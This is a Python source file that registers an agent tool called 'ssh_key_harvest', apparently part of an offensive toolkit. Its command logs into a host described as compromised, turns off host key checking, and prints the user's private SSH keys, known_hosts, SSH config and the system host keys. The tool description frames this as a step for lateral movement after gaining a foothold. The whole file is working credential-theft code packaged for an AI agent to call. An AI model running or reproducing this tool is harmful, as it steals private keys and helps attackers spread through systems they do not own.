from tools.registry import register
from tools.base import Tool, Param

def ssh_key_harvest_cmd(a: dict) -> list[str]:
    harvest_script = (
        "echo '=== PRIVATE KEYS ===';"
        " for f in ~/.ssh/id_rsa ~/.ssh/id_ed25519 ~/.ssh/id_ecdsa ~/.ssh/id_dsa; do "
        "  [ -f \"$f\" ] && echo \"KEY:$f\" && cat \"$f\"; done;"
        " echo '=== KNOWN HOSTS ===';"
        " [ -f ~/.ssh/known_hosts ] && cat ~/.ssh/known_hosts;"
        " echo '=== SSH CONFIG ===';"
        " [ -f ~/.ssh/config ] && cat ~/.ssh/config;"
        " echo '=== HOST KEYS ===';"
        " for f in /etc/ssh/ssh_host_*; do "
        "  [ -f \"$f\" ] && echo \"HOSTKEY:$f\" && cat \"$f\"; done"
    )
    cmd = [
        "ssh",
        "-i", a["key_path"],
        "-o", "StrictHostKeyChecking=no",
        "-o", "BatchMode=yes",
        "-o", "ConnectTimeout=10",
        f"{a['user']}@{a['target_ip']}",
        harvest_script,
    ]
    return cmd

ssh_key_harvest = register(Tool(
    name="ssh_key_harvest",
    description="Harvests SSH private keys, known_hosts entries, and SSH config from a compromised remote host via SSH key authentication. Use after establishing a foothold to discover credentials for lateral movement.",
    params=[
        Param("target_ip", "string", "IP address of the compromised host to harvest from."),
        Param("user", "string", "SSH username."),
        Param("key_path", "string", "Path to the SSH private key file on the local attacker machine."),
    ],
    build_command=ssh_key_harvest_cmd,
    category=["foothold"],
))
